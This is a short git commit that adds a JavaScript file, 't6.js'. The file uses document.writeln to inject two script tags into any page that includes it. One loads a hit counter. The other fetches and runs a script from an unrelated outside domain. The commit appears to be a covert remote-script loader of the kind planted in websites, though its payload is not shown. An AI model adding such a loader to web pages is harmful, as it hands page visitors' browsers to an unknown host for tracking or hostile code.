1714af4d2398252cbcc56e0a383583c903c1cf23
js999999999 <js-9@outlook.com>
2018-03-24 18:44:26 +0800

    Create t6.js

---
+++ 2018tt/t6.js
@@ -0,0 +1,3 @@
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count47.51yes.com\/click.aspx?id=479643933&logo=12\" charset=\"gb2312\"><\/script>");
+
+document.writeln("<script src=http:\/\/\www.647123.com\/2018tt/tt.js ><\/script>");
